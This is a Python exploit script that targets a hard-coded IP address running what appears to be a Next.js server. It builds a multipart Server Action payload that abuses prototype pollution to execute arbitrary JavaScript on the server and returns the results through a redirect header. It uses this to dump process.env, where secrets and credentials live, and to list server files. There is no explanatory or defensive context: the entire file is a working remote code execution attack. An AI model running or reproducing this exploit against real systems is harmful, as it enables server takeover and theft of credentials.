import urllib.request, uuid, re

BASE = "http://18.215.143.250:3000"
ACTION_SEARCH = "40881a01be516941afc21e3145707ceff4a34545af"

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirectHandler)

def execute_js(js_code):
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    
    escaped_js = js_code.replace('\\', '\\\\').replace('"', '\\"')
    wrapped_code = f"let res = (()=>{ {escaped_js} })(); throw Object.assign(new Error(), {{digest: 'NEXT_REDIRECT;push;/' + encodeURIComponent(String(res).slice(0, 500)) + ';307;'}});"
    
    prefix_val = wrapped_code.replace('\\', '\\\\').replace('"', '\\"') + "//"
    
    chunk0 = '{\n' + \
             '  "then": "$1:__proto__:then",\n' + \
             '  "status": "resolved_model",\n' + \
             '  "reason": -1,\n' + \
             '  "_response": {\n' + \
             '    "_prefix": "' + prefix_val + '",\n' + \
             '    "_formData": {\n' + \
             '      "get": "$1:constructor:constructor"\n' + \
             '    }\n' + \
             '  },\n' + \
             '  "value": "{\\"then\\":\\"$B0\\"}"\n' + \
             '}'

    
    chunk1 = '"$@0"'
    
    parts = [
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{chunk0}\r\n",
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{chunk1}\r\n",
        f"--{boundary}--\r\n"
    ]
    body = "".join(parts).encode()
    
    req = urllib.request.Request(
        BASE,
        data=body,
        headers={
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Next-Action': ACTION_SEARCH
        }
    )
    
    try:
        resp = opener.open(req, timeout=10)
        redir = resp.headers.get('x-action-redirect', '')
        return redir
    except urllib.error.HTTPError as e:
        redir = e.headers.get('x-action-redirect', '')
        return redir

# 1. Read process.env
print("Reading process.env:")
redir = execute_js("return JSON.stringify(process.env);")
print("ENV REDIR:", redir)

# 2. Check current directory and files
print("\nReading directory listing:")
redir = execute_js("return require('fs').readdirSync('.').join(',');")
print("FILES:", redir)
